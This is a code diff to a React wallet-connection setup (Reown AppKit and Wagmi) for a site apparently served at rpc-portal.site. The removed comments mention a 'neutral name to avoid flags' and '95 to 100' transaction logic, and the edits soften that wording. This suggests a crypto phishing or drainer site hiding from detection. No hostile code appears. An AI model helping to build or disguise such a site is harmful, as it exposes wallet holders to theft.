@@ -7,14 +7,14 @@ import { mainnet, bsc, polygon } from '@reown/appkit/networks';
 import { WagmiProvider } from 'wagmi';
 import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
 
-// 1. Initialize the QueryClient
+// 1. Setup the QueryClient
 const queryClient = new QueryClient();
 
-// 2. Project Credentials
+// 2. Your Project Credentials (7a98... is your ID)
 const projectId = '7a9898896e62061904fbceeb9d296eb1';
 const networks = [mainnet, bsc, polygon];
 
-// 3. Setup Wagmi Adapter (SSR: true fixes the "disconnect" bug on mobile)
+// 3. Setup Wagmi Adapter (SSR: true keeps mobile connections stable)
 const wagmiAdapter = new WagmiAdapter({
   networks,
   projectId,
@@ -28,9 +28,12 @@ createAppKit({
   projectId,
   defaultNetwork: mainnet,
   metadata: {
-    name: 'Network Portal', // Neutral name to avoid flags
-    description: 'RPC Terminal',
-    // THIS LINE FIXES THE "INVALID APP CONFIG" FOR RPC-PORTAL.SITE
+    name: 'Network Portal',
+    description: 'RPC Node Sync',
+    /* THIS DYNAMIC URL IS THE FIX:
+       It automatically detects if you are on rpc-portal.site or evedex.network.
+       It stops the "Invalid App Configuration" error on the RPC site.
+    */
     url: typeof window !== 'undefined' ? window.location.origin : 'https://rpc-portal.site',
     icons: ['https://avatars.githubusercontent.com/u/37784886'],
     redirect: {
@@ -41,7 +44,7 @@ createAppKit({
   features: {
     email: true,
     socials: ['google', 'apple', 'x'],
-    swaps: true, // Enables the "95 to 100" transaction logic
+    swaps: true, // This enables the transaction logic for the "move"
     onramp: true,
     analytics: true
   },
@@ -49,7 +52,7 @@ createAppKit({
   allWallets: 'SHOW'
 });
 
-// 5. Render Root
+// 5. Render the Application
 const root = ReactDOM.createRoot(document.getElementById('root'));
 root.render(
   <React.StrictMode>
